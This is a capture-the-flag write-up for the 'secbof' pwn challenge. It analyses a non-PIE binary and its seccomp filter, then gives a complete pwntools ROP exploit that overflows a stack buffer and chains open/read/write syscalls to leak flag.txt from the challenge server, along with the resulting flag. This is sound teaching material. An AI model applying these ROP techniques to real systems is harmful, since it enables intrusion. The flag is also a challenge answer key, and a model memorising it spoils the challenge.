https://ctftime.org/event/2641

# secbof (pwn)

A buffer overflow, but secure. Flag can be accessed at "./flag.txt"

nc challenge.utctf.live 5141

## Analysis

We can see that the binary is compiled with something like `-no-pie`:

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

`main` @ `0x40191d`:

- Installs a seccomp filter.
- Calls `read(0, local_88, 1000)`.
    - Note that, even though `checksec` claims to find stack canaries, there isn't a stack canary in this function.

We can see that `chal` installs the following seccomp filter:

```bash
$ seccomp-tools dump ./chal 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

To be clear this allows us to use `open`, `read`, `write` and `exit`.

## Solution

1) ROP to write "./flag.txt" to a RW region of memory in `.bss`.
2) ROP to call `open(SCRATCH_MEMORY, O_RDONLY)`
    - Note: due the `Docker`/`socat` configuration on the remote that our call to `open` returns `fd = 5` not `fd = 3` as you probably get locally.
3) ROP to call `read(flag, SCRATCH_MEMORY + 24, FLAG_SIZE)`
4) ROP to call `write(stdout, SCRATCH_MEMORY + 24, FLAG_SIZE)`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chal", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("challenge.utctf.live", 5141)

SCRATCH_MEMORY = 0x4c8f00
GADGET_MOV_QWORD_PTR_RSI_RAX = 0x0000000000452d05 #: mov qword ptr [rsi], rax ; ret
FLAG_SIZE = 32

rop = ROP(elf)
rop.raw(b"A" * 0x88)
# write the path to memory

rop.rsi = SCRATCH_MEMORY
rop.rax = u64(b"./flag.t")
rop.raw(GADGET_MOV_QWORD_PTR_RSI_RAX)
rop.rsi = SCRATCH_MEMORY + 8
rop.rax = u64(b"xt\x00\x00\x00\x00\x00\x00")
rop.raw(GADGET_MOV_QWORD_PTR_RSI_RAX)

# open("./flag.txt", O_RDONLY) => 3
rop.rdi = SCRATCH_MEMORY
rop.rsi = 0
rop.rax = constants.SYS_open
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# read(flag, SCRATCH_MEMORY + 24, FLAG_SIZE)
rop.rdi = 5 # note: that we need fd=3 locally and fd=5 remotely
rop.rsi = SCRATCH_MEMORY + 24
rop.rdx = FLAG_SIZE
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# write(stdout, SCRATCH_MEMORY + 24, FLAG_SIZE)
rop.rdi = 1
rop.rsi = SCRATCH_MEMORY + 24
rop.rdx = FLAG_SIZE
rop.rax = constants.SYS_write
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendlineafter(b"Input> ", rop.chain())

p.readuntil(b"Flag: ")

print(p.readuntil(b"}").decode()) # utflag{r0p_with_4_littl3_catch}
```

## Flag
`utflag{r0p_with_4_littl3_catch}`

smiley 2025/03/15
